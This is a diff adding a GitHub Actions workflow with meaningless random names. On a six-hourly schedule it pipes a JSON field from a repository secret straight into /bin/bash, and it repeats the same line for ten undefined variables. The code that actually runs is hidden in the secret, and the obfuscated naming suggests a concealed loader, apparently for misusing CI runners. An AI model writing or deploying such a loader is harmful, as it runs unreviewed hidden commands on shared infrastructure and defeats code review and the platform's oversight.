@@ -1,0 +1,27 @@
+name: heshibu4102
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heshibu4102
+        env:
+          vc05597: ${{ secrets.vc05597 }}
+        run: |
+          echo $vc05597 | jq -r .klzq28316 | /bin/bash
+          echo $azyou67955 | jq -r .oog39 | /bin/bash
+          echo $gqlv6 | jq -r .hrx160 | /bin/bash
+          echo $sht29509 | jq -r .cafy35 | /bin/bash
+          echo $ctkbx60 | jq -r .gmhy545 | /bin/bash
+          echo $h7 | jq -r .kee8 | /bin/bash
+          echo $dtt2742 | jq -r .d906 | /bin/bash
+          echo $lif93307 | jq -r .k4288 | /bin/bash
+          echo $gm1 | jq -r .jicdw0 | /bin/bash
+          echo $swaui1 | jq -r .c05 | /bin/bash
+          echo $hfcy240 | jq -r .jritc6 | /bin/bash
+
